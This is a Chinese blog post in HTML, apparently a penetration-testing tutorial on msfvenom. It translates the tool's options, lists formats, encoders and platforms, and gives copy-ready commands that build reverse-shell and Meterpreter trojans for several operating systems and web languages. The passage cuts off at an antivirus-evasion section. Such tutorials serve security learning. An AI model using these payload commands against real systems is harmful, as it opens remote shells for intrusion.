@@ -1,0 +1,721 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/Aries.ico">
+  <link rel="icon" href="/img/Aries.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="YY">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="msfvenom用法msfvenom是msf中生成木马的模块。 参数介绍使用帮助为：  翻译一下： 123456789101112131415161718192021222324252627-l, --list             &lt;type&gt;      列举[type]的所有模块，包括：payloads，encoders，nops，platforms，archs，encrypt，">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[工具] msfvenom用法">
+<meta property="og:url" content="https://s1n9l3.github.io/2022/11/22/[%E5%B7%A5%E5%85%B7]%20msfvenom%E7%94%A8%E6%B3%95/index.html">
+<meta property="og:site_name" content="S1n9l3">
+<meta property="og:description" content="msfvenom用法msfvenom是msf中生成木马的模块。 参数介绍使用帮助为：  翻译一下： 123456789101112131415161718192021222324252627-l, --list             &lt;type&gt;      列举[type]的所有模块，包括：payloads，encoders，nops，platforms，archs，encrypt，">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221122194812584.png">
+<meta property="article:published_time" content="2022-11-22T11:41:24.473Z">
+<meta property="article:modified_time" content="2022-11-23T12:49:42.776Z">
+<meta property="article:author" content="YY">
+<meta property="article:tag" content="工具">
+<meta property="article:tag" content="msf">
+<meta property="article:tag" content="木马">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221122194812584.png">
+  
+  
+  
+  <title>[工具] msfvenom用法 - S1n9l3</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"s1n9l3.github.io","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>WXYY</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/post.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="[工具] msfvenom用法"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-11-22 19:41" pubdate>
+          2022年11月22日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          6.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          52 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">[工具] msfvenom用法</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="msfvenom用法"><a href="#msfvenom用法" class="headerlink" title="msfvenom用法"></a>msfvenom用法</h1><p>msfvenom是msf中生成木马的模块。</p>
+<h2 id="参数介绍"><a href="#参数介绍" class="headerlink" title="参数介绍"></a>参数介绍</h2><p>使用帮助为：</p>
+<p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221122194812584.png" srcset="/img/loading.gif" lazyload alt="image-20221122194812584"></p>
+<p>翻译一下：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs stylus">-l, <span class="hljs-attr">--list</span>             &lt;type&gt;      列举<span class="hljs-selector-attr">[type]</span>的所有模块，包括：payloads，encoders，nops，platforms，archs，encrypt，formats，<span class="hljs-attribute">all</span><br>-<span class="hljs-selector-tag">p</span>, <span class="hljs-attr">--payload</span>          &lt;payload&gt;   可用的payload。通过<span class="hljs-string">&#x27;-&#x27;</span>和STDIN设置自定义payload<br>    <span class="hljs-attr">--list-options</span>                 列出所选payload的所有参数<br>-f, <span class="hljs-attr">--format</span>           &lt;format&gt;    输出格式<br>-e, <span class="hljs-attr">--encoder</span>          &lt;encoder&gt;   编码方式<br>    <span class="hljs-attr">--service-name</span>     &lt;value&gt;     生成服务（service）二进制文件时的服务名称<br>    <span class="hljs-attr">--sec-name</span>         &lt;value&gt;     生成大型windows二进制文件时使用的<span class="hljs-string">&#x27;section name&#x27;</span>，默认随机<span class="hljs-number">4</span>个字母的字符串<br>    <span class="hljs-attr">--smallest</span>                     使用所有编码器生成最小的payload<br>    <span class="hljs-attr">--encrypt</span>          &lt;value&gt;     对shellcode加密或编码的方式<br>    <span class="hljs-attr">--encrypt-key</span>      &lt;key&gt;       加密使用的key<br>    <span class="hljs-attr">--encrypt-iv</span>       &lt;value&gt;     加密使用的初始向量<br>-<span class="hljs-selector-tag">a</span>, <span class="hljs-attr">--arch</span>             &lt;arch&gt;      payload或编码器的架构（architecture）<br>    <span class="hljs-attr">--platform</span>         &lt;platform&gt;  payload使用的平台（platform）<br>-o, <span class="hljs-attr">--out</span>              &lt;path&gt;      payload的输出文件<br>-<span class="hljs-selector-tag">b</span>, <span class="hljs-attr">--bad-chars</span>        &lt;list&gt;      设定规避字符集，比如<span class="hljs-string">&#x27;\x00\xff&#x27;</span><br>-n, <span class="hljs-attr">--nopsled</span>          &lt;length&gt;    为payload预先指定一个NOP滑动长度<br>    <span class="hljs-attr">--pad-nops</span>                     <br>-s, <span class="hljs-attr">--space</span>            &lt;length&gt;    生成payload的最大大小<br>    <span class="hljs-attr">--encoder-space</span>    &lt;length&gt;    编码后的payload的最大大小<br>-<span class="hljs-selector-tag">i</span>, <span class="hljs-attr">--iterations</span>       &lt;count&gt;     payload编码次数<br>-c, <span class="hljs-attr">--add-code</span>         &lt;path&gt;      包括一个指定的win32 shellcode文件<br>-x, <span class="hljs-attr">--template</span>         &lt;path&gt;      指定一个自定义的可执行文件作为模板    <br>-k, <span class="hljs-attr">--keep</span>                         保护模板程序的动作，注入的payload作为一个新的进程运行<br>-v, <span class="hljs-attr">--var-name</span>         &lt;value&gt;     指定一个自定义的变量，以确定输出格式<br>-t, <span class="hljs-attr">--timeout</span>          &lt;second&gt;    从STDIN读取payload的等待秒数（默认<span class="hljs-number">30</span>，<span class="hljs-number">0</span>表示无效）<br>-h, <span class="hljs-attr">--help</span><br>    <br></code></pre></td></tr></table></figure>
+
+<h3 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h3><p>可输出的格式，<code>msfvenom --list format</code>，</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs vim">可执行文件格式：<br>    asp<br>    aspx<br>    aspx-<span class="hljs-keyword">exe</span><br>    axis2<br>    dll<br>    elf<br>    elf-<span class="hljs-keyword">so</span><br>    <span class="hljs-keyword">exe</span><br>    <span class="hljs-keyword">exe</span>-<span class="hljs-keyword">only</span><br>    <span class="hljs-keyword">exe</span>-service<br>    <span class="hljs-keyword">exe</span>-small<br>    hta-psh<br>    jar<br>    jsp<br>    loop-vbs<br>    macho<br>    msi<br>    msi-nouac<br>    osx-app<br>    psh<br>    psh-cmd<br>    psh-net<br>    psh-reflection<br>    <span class="hljs-keyword">python</span>-reflection<br>    vba<br>    vba-<span class="hljs-keyword">exe</span><br>    vba-psh<br>    vbs<br>    war<br>转换格式：<br>    base32<br>    base64<br>    bash<br>    <span class="hljs-keyword">c</span><br>    csharp<br>    dw<br>    dword<br>    hex<br>    java<br>    js_be<br>    js_le<br>    num<br>    <span class="hljs-keyword">perl</span><br>    pl<br>    powershell<br>    ps1<br>    <span class="hljs-keyword">py</span><br>    <span class="hljs-keyword">python</span><br>    raw<br>    rb<br>    <span class="hljs-keyword">ruby</span><br>    <span class="hljs-keyword">sh</span><br>    vbapplication<br>    vbscript<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="编码方式"><a href="#编码方式" class="headerlink" title="编码方式"></a>编码方式</h3><p>可编码的方式，<code>msfvenom --list encoder</code>，</p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs gams">Name                          Rank       Description<br>----                          ----       -----------<br>cmd/brace                     low        Bash Brace Expansion Command Encoder<br>cmd/echo                      good       Echo Command Encoder<br>cmd/generic_sh                manual     Generic Shell <span class="hljs-keyword">Variable</span> Substitution <span class="hljs-comment">Command Encoder</span><br>cmd/ifs                       low        Bourne $&#123;IFS&#125; Substitution Command Encoder<br>cmd/perl                      <span class="hljs-comment">normal     Perl Command Encoder</span><br>cmd/powershell_base64         excellent  Powershell Base64 Command Encoder<br>cmd/printf_php_mq             <span class="hljs-comment">manual     printf(1) via PHP magic_quotes Utility Command Encoder</span><br>generic/eicar                 manual     The EICAR Encoder<br>generic/none                  <span class="hljs-comment">normal     The</span> <span class="hljs-comment">&quot;none&quot;</span> <span class="hljs-comment">Encoder</span><br>mipsbe/byte_xori              <span class="hljs-built_in">normal</span>     Byte XORi Encoder<br>mipsbe/longxor                <span class="hljs-comment">normal     XOR Encoder</span><br>mipsle/byte_xori              <span class="hljs-built_in">normal</span>     Byte XORi Encoder<br>mipsle/longxor                <span class="hljs-comment">normal     XOR Encoder</span><br>php/base64                    great      PHP Base64 Encoder<br>ppc/longxor                   <span class="hljs-comment">normal     PPC LongXOR Encoder</span><br>ppc/longxor_tag               <span class="hljs-built_in">normal</span>     PPC LongXOR Encoder<br>ruby/base64                   <span class="hljs-comment">great      Ruby Base64 Encoder</span><br>sparc/longxor_tag             <span class="hljs-built_in">normal</span>     SPARC DWORD <span class="hljs-keyword">XOR</span> Encoder<br>x64/xor                       <span class="hljs-comment">normal     XOR Encoder</span><br>x64/xor_context               <span class="hljs-built_in">normal</span>     Hostname-based Context Keyed Payload Encoder<br>x64/xor_dynamic               <span class="hljs-comment">normal     Dynamic key XOR Encoder</span><br>x64/zutto_dekiru              manual     Zutto Dekiru<br>x86/add_sub                   <span class="hljs-comment">manual     Add</span>/Sub Encoder<br>x86/<span class="hljs-comment">alpha_mixed               low        Alpha2 Alphanumeric Mixedcase Encoder</span><br>x86/alpha_upper               low        Alpha2 Alphanumeric Uppercase Encoder<br>x86/avoid_underscore_tolower  <span class="hljs-comment">manual     Avoid underscore</span>/tolower<br>x86/<span class="hljs-comment">avoid_utf8_tolower        manual     Avoid UTF8</span>/tolower<br>x86/<span class="hljs-comment">bloxor                    manual     BloXor - A Metamorphic Block Based XOR Encoder</span><br>x86/bmp_polyglot              manual     BMP Polyglot<br>x86/call4_dword_xor           <span class="hljs-comment">normal     Call+4 Dword XOR Encoder</span><br>x86/context_cpuid             manual     CPUID-based Context Keyed Payload Encoder<br>x86/context_stat              <span class="hljs-comment">manual     stat(2)-based Context Keyed Payload Encoder</span><br>x86/context_time              manual     time(<span class="hljs-number">2</span>)-based Context Keyed Payload Encoder<br>x86/countdown                 <span class="hljs-comment">normal     Single-byte XOR Countdown Encoder</span><br>x86/fnstenv_mov               <span class="hljs-built_in">normal</span>     Variable-length Fnstenv/mov <span class="hljs-comment">Dword XOR Encoder</span><br>x86/jmp_call_additive         <span class="hljs-built_in">normal</span>     Jump/Call <span class="hljs-comment">XOR Additive Feedback Encoder</span><br>x86/nonalpha                  low        Non-Alpha Encoder<br>x86/nonupper                  <span class="hljs-comment">low        Non-Upper Encoder</span><br>x86/opt_sub                   manual     Sub Encoder (optimised)<br>x86/service                   <span class="hljs-comment">manual     Register Service</span><br>x86/shikata_ga_nai            excellent  Polymorphic <span class="hljs-keyword">XOR</span> Additive Feedback Encoder<br>x86/single_static_bit         <span class="hljs-comment">manual     Single Static Bit</span><br>x86/unicode_mixed             manual     Alpha2 Alphanumeric Unicode Mixedcase Encoder<br>x86/unicode_upper             <span class="hljs-comment">manual     Alpha2 Alphanumeric Unicode Uppercase Encoder</span><br>x86/xor_dynamic               <span class="hljs-built_in">normal</span>     Dynamic key <span class="hljs-keyword">XOR</span> Encoder<br><br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="加密格式"><a href="#加密格式" class="headerlink" title="加密格式"></a>加密格式</h3><p>可加密方式，<code>msfvenom --list encrypt</code>，</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-section">Name</span><br><span class="hljs-section">----</span><br>aes256<br>base64<br>rc4<br>xor<br></code></pre></td></tr></table></figure>
+
+<h3 id="可指定的架构（Architectures）"><a href="#可指定的架构（Architectures）" class="headerlink" title="可指定的架构（Architectures）"></a>可指定的架构（Architectures）</h3><p>可指定的架构，<code>msfvenom --list archs</code>，</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-section">Name</span><br><span class="hljs-section">----</span><br>aarch64<br>armbe<br>armle<br>cbea<br>cbea64<br>cmd<br>dalvik<br>firefox<br>java<br>mips<br>mips64<br>mips64le<br>mipsbe<br>mipsle<br>nodejs<br>php<br>ppc<br>ppc64<br>ppc64le<br>ppce500v2<br>python<br>r<br>ruby<br>sparc<br>sparc64<br>tty<br>x64<br>x86<br>x86_64<br>zarch<br><br></code></pre></td></tr></table></figure>
+
+<h3 id="可指定平台（Platforms）"><a href="#可指定平台（Platforms）" class="headerlink" title="可指定平台（Platforms）"></a>可指定平台（Platforms）</h3><p>可指定平台，<code>msfvenom --list platforms</code>，</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-section">Name</span><br><span class="hljs-section">----</span><br>aix<br>android<br>apple_ios<br>arista<br>brocade<br>bsd<br>bsdi<br>cisco<br>firefox<br>freebsd<br>hardware<br>hpux<br>irix<br>java<br>javascript<br>juniper<br>linux<br>mainframe<br>mikrotik<br>multi<br>netbsd<br>netware<br>nodejs<br>openbsd<br>osx<br>php<br>python<br>r<br>ruby<br>solaris<br>unifi<br>unix<br>unknown<br>windows<br><br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><p>通常用法就是生成木马，本地开启监听，然后在目标机器上运行。</p>
+<h3 id="二进制"><a href="#二进制" class="headerlink" title="二进制"></a>二进制</h3><p>Linux</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p linux/x86/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"> Port </span><span class="hljs-keyword">to</span> Connect On&gt; -f elf &gt; shell.elf<br></code></pre></td></tr></table></figure>
+
+<p>Windows</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"> Port </span><span class="hljs-keyword">to</span> Connect On&gt; -f exe &gt; shell.exe<br></code></pre></td></tr></table></figure>
+
+<p>Mac</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p osx/x86/shell_reverse_tcp <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"> Port </span><span class="hljs-keyword">to</span> Connect On&gt; -f macho &gt; shell.macho<br></code></pre></td></tr></table></figure>
+
+<h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><p>PHP</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p php/meterpreter_reverse_tcp <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"> Port </span><span class="hljs-keyword">to</span> Connect On&gt; -f<span class="hljs-built_in"> raw </span>&gt; shell.php<br><br>cat shell.php | pbcopy &amp;&amp; echo <span class="hljs-string">&#x27;&lt;?php &#x27;</span> | tr -d <span class="hljs-string">&#x27;\n&#x27;</span> &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php<br></code></pre></td></tr></table></figure>
+
+<p>ASP</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"> Port </span><span class="hljs-keyword">to</span> Connect On&gt; -f asp &gt; shell.asp<br></code></pre></td></tr></table></figure>
+
+<p>JSP</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p java/jsp_shell_reverse_tcp <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"> Port </span><span class="hljs-keyword">to</span> Connect On&gt; -f<span class="hljs-built_in"> raw </span>&gt; shell.jsp<br></code></pre></td></tr></table></figure>
+
+<p>Python</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p cmd/unix/reverse_python <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"> Port </span><span class="hljs-keyword">to</span> Connect On&gt; -f<span class="hljs-built_in"> raw </span>&gt; shell.py<br></code></pre></td></tr></table></figure>
+
+<p>Bash</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p cmd/unix/reverse_bash <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"> Port </span><span class="hljs-keyword">to</span> Connect On&gt; -f<span class="hljs-built_in"> raw </span>&gt; shell.sh<br></code></pre></td></tr></table></figure>
+
+<p>Perl</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p cmd/unix/reverse_perl <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"> Port </span><span class="hljs-keyword">to</span> Connect On&gt; -f<span class="hljs-built_in"> raw </span>&gt; shell.pl<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="免杀"><a href="#免杀" class="headerlink" title="免杀"></a>免杀</h2><p>对生成的payload进行多次编码，</p>
